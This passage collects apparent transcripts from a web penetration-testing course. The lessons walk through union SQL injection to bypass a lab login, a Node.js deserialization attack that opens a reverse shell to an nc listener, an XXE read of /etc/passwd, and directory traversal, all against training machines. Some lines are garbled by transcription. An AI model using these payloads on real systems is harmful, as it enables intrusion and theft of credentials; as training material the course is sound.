> **[0:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=38)** As admin-portal.europacorp.htb.
>
> **[0:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=53)** Okay, let's start at Burp Suite.
>
> **[0:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=58)** And we'll go to Proxy.
>
> **[1:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=60)** Turn off Intercept.
>
> **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=61)** And open the browser.
>
> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=63)** And we'll go to https.
>
> **[1:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=69)** admin-portal.europacorp.htb.
>
> **[1:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=77)** We've now got an admin portal login, which it would appear is still under construction.
>
> **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=83)** Let's send in a request with a correctly formatted email address and then check the message exchanges in Burp Suite.
>
> **[1:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=90)** admin@europacorp.htb.
>
> **[1:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=96)** And we'll put a password in of password.
>
> **[1:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=102)** Okay.
>
> **[1:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=104)** We can see we've received the login page GET request followed by our login POST.
>
> **[1:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=110)** Let's look at that.
>
> **[1:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=112)** We can see in the POST request that our credentials are at the bottom of the packet.
>
> **[2:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=120)** Let's send the message to the Repeater.
>
> **[2:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=123)** Action, Send to Repeater.
>
> **[2:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=127)** One of the options to achieve SQL injection is to use a union injection technique.
>
> **[2:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=132)** But we need to know how many columns we have in the table.
>
> **[2:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=136)** We can find that out by trial and error.
>
> **[2:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=139)** We'll change the information at the bottom of the packet to: email=" union all select null, null, null # and password=password.
>
> **[2:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=163)** And that will attempt a three column union attack.
>
> **[2:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=167)** Okay, so let's send that.
>
> **[2:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=170)** Okay.
>
> **[2:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=171)** And that doesn't work.
>
> **[2:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=174)** Let's try four columns.
>
> **[2:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=179)** And that doesn't work.
>
> **[3:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=181)** Let's try five.
>
> **[3:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=186)** Okay, that works, and we get a 302 response.
>
> **[3:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=189)** So let's follow the redirection.
>
> **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=192)** We can now select, from the Actions, Request in Browser, In original session.
>
> **[3:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=202)** Copy the link.
>
> **[3:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=207)** And paste it into our browser.
>
> **[3:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=211)** And after a few seconds, we're redirected into the admin dashboard.
>
> **[3:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=216)** We successfully used Burp Suite to inject an SQL union command to circumvent the authentication and deliver admin access to the website.

> [!info]- Semantic Content
>
> **Code Keywords:** let (10)
> **Env Vars:** sql (4), post (2)
> **UI Navigation:** go to (2), open the (1)
> **CLI Commands:** sudo (1), find (1)
> **API Endpoints:** get  (1), post  (1)
> **Versions:** 10.10.10 (1)
> **Definitions:** is a  (1)
> **Prerequisites:** set up (1)

#### Exploiting Node.js
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=0)** - [Narrator] Node.js is a web server technology built using Chrome's V8 JavaScript engine.
>
> **[0:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=7)** It uses an event driven non-blocking communications model that makes it lightweight and efficient and suitable for large scale web use.
>
> **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=16)** This is supported by an open source library called npm.
>
> **[0:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=20)** Node.js is used to collect forms data, generate dynamic page content, and manipulate files and databases.
>
> **[0:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=28)** A Node.js module is started using the node command at the command line and will associate to a port.
>
> **[0:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=36)** The module will be executed to process messages when a user connects to that port.
>
> **[0:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=41)** Node.js is a form of Java engine.
>
> **[0:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=44)** The key difference between JavaScript and Node.js is that execution of JavaScript occurs at the client whereas Node.js runs JavaScript on the server.
>
> **[0:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=56)** Let's take a look at the Hack The Box Celestial server.
>
> **[1:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=60)** Our enumeration shows us that port 3000 is open and delivering the Node.js Express framework service.
>
> **[1:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=69)** Let's take a look at Celestial using Burp Suite.
>
> **[1:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=75)** We'll go to proxy, set intercept off, and open the browser.
>
> **[1:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=81)** And we'll navigate to "10.10.10.85:3000".
>
> **[1:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=90)** We get a 404, but when we refresh, we get a simple message telling us two plus two is 22.
>
> **[1:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=103)** Back in Burp Suite, we can see there's an element "profile=" in the response message.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=109)** We'll highlight the contents of the profile line, and we'll send it to the decoder.
>
> **[1:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=119)** And in the decoder, we'll decode it as Base64.
>
> **[2:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=125)** Okay, we get a set of identifiers and values.
>
> **[2:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=130)** Let's change the values.
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=133)** We'll make the username "Akhtar".
>
> **[2:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=137)** We'll make the country "Australia".
>
> **[2:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=144)** We'll make the city "Melbourne".
>
> **[2:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=148)** Let's change the number to five.
>
> **[2:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=154)** Remove the rest of the line and put a curly bracket closing.
>
> **[2:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=160)** Okay, let's encode it as Base64 and we'll copy the resulting string.
>
> **[2:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=171)** Let's right-click the response and send it to repeater.
>
> **[3:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=181)** And let's replace the "Cookie profile" with our new value and send that.
>
> **[3:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=190)** Okay, we can see the responses returned.
>
> **[3:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=194)** "Hey Akhtar, 5 + 5 is 55" We're now actively interacting with the Node.js server.
>
> **[3:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=202)** Let's take a look at ajinabraham's GitHub site where he provides a Node.js reverse shell.
>
> **[3:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=209)** We can see the usage instructions at the start of the code.
>
> **[3:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=213)** We can use this to gain shell access to the server.
>
> **[3:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=217)** I've already copied this in, so let's run the script with my IP address and use port 2222 for the reverse shell, and we'll use Python 2.7 for this, "njs.py 10.10.14.11" and "2222".
>
> **[3:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=237)** Okay, that provides an immediate eval function which we can use.
>
> **[4:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=242)** We can exploit to deserialization floor by using this.
>
> **[4:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=246)** We need to set it up as a Node.js list, which I've already done.
>
> **[4:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=255)** We need to prefix the function with the RCE identifier, and provide a leading string "$$ND_FUNC.function", and provide some trailing brackets.
>
> **[4:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=268)** Okay, let's copy this.
>
> **[4:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=271)** Go back to Burp Suite.
>
> **[4:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=273)** Now let's transfer the encoded results to the repeater.
>
> **[4:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=277)** Before we send it, we need to open a listener on port 2222, "nc -lp 2222" and send.
>
> **[4:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=290)** We can see the response as "invalid user type".
>
> **[4:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=293)** This is expected.
>
> **[4:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=295)** Let's check our listener.
>
> **[4:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=298)** We can see we're connected.
>
> **[4:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=299)** Let's find out who we are, "whoami".
>
> **[5:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=304)** We're Sun, and let's find out where we are.
>
> **[5:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=310)** We're in "/home/sun", and let's see what's in there.
>
> **[5:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=314)** And let's have a look at Documents, and we can see two files, script.py and user.txt.
>
> **[5:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=327)** And when we "cat Documents/user.txt",
>
> **[5:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=335)** we get the user token.
>
> **[5:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=337)** Node.js sends commands to the server using Base64 encoding.
>
> **[5:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=342)** By intercepting a message and replacing the data being sent, we can interact with the Node.js server.
>
> **[5:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=348)** When combined with a usable vulnerability, this provides an ideal access path to get a shell.

> [!info]- Semantic Content
>
> **Code Keywords:** let (16), function (3), module (2), this. (2), this, (1)
> **CLI Commands:** node (13), make (3), find (2), npm (1), python (1)
> **File Paths:** node.js (12), njs.py (1), script.py (1), user.txt (1), documents/user.txt (1)
> **Ports:** port 2222 (2), port 3000 (1), :3000 (1)
> **UI Navigation:** go to (1), open the (1), navigate to (1), right-click (1)
> **Versions:** 10.10.10 (1), python 2 (1), 10.10.14 (1)
> **Env Vars:** rce (1), nd_func (1)
> **Tools:** command line (1), github (1)

#### Injecting XML into a web page
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=0)** - XML is another technology which is used in webpages.
>
> **[0:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=4)** If we can inject XML, then we may be able to use it to gain access to data.
>
> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=9)** Let's see how we might inject some code into a server via an XML input field.
>
> **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=15)** For this testing, we'll use Mutillidae.
>
> **[0:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=18)** We'll select XML external entities and open the XML validator page.
>
> **[0:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=25)** And let's enter message "hello folks" and validate that.
>
> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=39)** And this validates and we can see the message displayed.
>
> **[0:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=43)** Let's exploit this webpage.
>
> **[0:45](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=45)** We can input a slightly more complex XML construct.
>
> **[0:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=48)** to access the contents of a file.
>
> **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=51)** In this case, we'll check the contents of /et cetera/ password and we'll do that with shriek doc type.
>
> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=63)** And we'll give it to name, and shriek entity and we'll just call it F as a variable and system.
>
> **[1:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=76)** And the system entity we want is the file /// et cetera / password.
>
> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=89)** And we'll put out the message with the contents of that, and validate that.
>
> **[1:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=101)** And we can see the contents of the /et cetera/ password file.
>
> **[1:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=106)** This technique does have some limitations in terms of the content in the external file but it demonstrates the way in which we can exploit XML.

> [!info]- Semantic Content
>
> **Env Vars:** xml (7)
> **Code Keywords:** let (3), case, (1), type. (1)
> **UI Navigation:** open the (1)
> **Speakers:** - xml (1)

#### File access through a web application URL
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=0)** - [Narrator] Easy Chat is a simple browser based chat server and we can use it to demonstrate how to exploit a web application in order to break into the system as a whole.
>
> **[0:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=10)** This is a Windows based application and I have it running on IP address, 192.168.1.149.
>
> **[0:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=18)** There are a number of vulnerabilities in this application.
>
> **[0:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=22)** One of them enables us to use the URL to navigate to specific folders outside of the web root.
>
> **[0:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=29)** Let's connect to Easy Chat using Burp Suite's web browser.
>
> **[0:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=33)** Go to proxy.
>
> **[0:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=35)** Turn Intercept off and open the browser.
>
> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=39)** And we'll go to 192.168.1.149.
>
> **[0:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=44)** Here we see the chat interface.
>
> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=46)** We're just looking at the default chat rooms that come with the software.
>
> **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=51)** Back in Burp Suite, let's send the HTTP request to repeater and in repeater in the request, we'll change the get and we'll just move up the directory tree and request the temp folder and a file I've placed in there called password.txt and we'll send that.
>
> **[1:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=82)** And here we can see Sam Spades' user ID and password.
>
> **[1:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=87)** We successfully carried out a directory traversal through the Windows system.

> [!info]- Semantic Content
>
> **Code Keywords:** let (2), interface (1)
> **UI Navigation:** go to (2), open the (1)
> **Env Vars:** url (1), http (1)
> **Versions:** 192.168.1 (2)
> **Definitions:** is a  (2)
> **File Paths:** password.txt (1)
> **Speakers:** - [narrator] (1)


### 6. Content Management

> [[#Table of Contents|↑ Back to Table of Contents]]

#### Understanding CMS targets
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=0)** - [Instructor] A content management system, or CMS, is most often seen as a web-based application, which provides a framework for rapid development of a website.
>
> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=9)** Without needing to understand complex HTML constructs, it will have a number of modules.
>
> **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=16)** The first is the web content interface, which allows a user to add the text, images, video, audio and so on, required for their website.
>
> **[0:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=26)** The second is the content delivery application, which processes the stored content and creates the website pages.
>
> **[0:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=34)** A CMS will have a database backend, which holds the content, and other capabilities, such as an administrative tool, wizards, logging, and so on.
>
> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=46)** One of the popular personal CMS systems is WordPress, designed for individuals to create their own personal website with an emphasis on third-party plugins and used extensively for blogging.
>
> **[0:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=59)** The large ecosystem around WordPress means that users don't have to have specialized knowledge as whatever they need to do is likely available as a standard plugin.
>
> **[1:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=71)** Joomla! and Drupal are two of the more sophisticated content management systems.
>
> **[1:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=76)** Often used by businesses, these have strong collaboration capabilities to enable distributed content development.
>
> **[1:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=85)** Each CMS system works differently.
>
> **[1:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=87)** However, they all deliver content which is created and accessed through a web browser.
>
> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=93)** The web developer adds or modifies content through the developer portal, and this updates the backend database.
>
> **[1:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=101)** The content framework will usually add the links that are required to render that content in the appropriate place on the website.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=109)** Some CMS systems enable changes to be published in real time.
>
> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=114)** Others may be designed such that many developers can change and submit content, but only the site administrator can review and publish.
>
> **[2:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=123)** Early versions of CMS provided a limited ability which enabled users to create simple websites, and anything more complex had to be coded by hand.
>
> **[2:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=134)** Websites are now mostly developed using content management systems.
>
> **[2:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=137)** Contemporary CMS systems are feature-rich and enable much more complex websites to be built and for many, there's a thriving ecosystem of plugin modules to add sophisticated functionality at the click of a button.
>
> **[2:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=154)** There are many open-source content management systems, such as WordPress, Joomla! and Drupal.
>
> **[2:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=160)** There are also some highly respected commercial systems, such as Sitefinity and Sitecore.
>
> **[2:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=166)** Given their widespread adoption, it's now important for a pen tester to be not only familiar with content management system concepts, but also have hands-on experience testing them.
>
> **[2:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=178)** From a pen testing perspective, by managing the technical content development, a CMS avoids many of the simpler mistakes that may occur in a hand-coded website.
>
> **[3:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=189)** However, CMSs have two features, which a pen tester will want to check for flaws, the ability to plug in active content, such as PHP, and the fact that many users may store sensitive information, such as credentials, unprotected in the backend database.

> [!info]- Semantic Content
>
> **Env Vars:** cms (8), html (1), php (1)
> **Analogies:** such as (5)
> **CLI Commands:** php (1)
> **Code Keywords:** interface (1)
> **Prerequisites:** required to (1)
> **Speakers:** - [instructor] (1)

#### Getting into WordPress
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=0)** - [Speaker] WordPress is a very popular content management system for individual and small business users.
>
> **[0:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=6)** However, it's not without its problems, both in the way it gets installed and also with some well publicized exploits.
>
> **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=13)** Let's check for exploits using searchsploit wordpress
>
> **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=23)** and there's quite a few here.
>
> **[0:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=25)** In fact, there's over a thousand covering the web application and its many plugins.
>
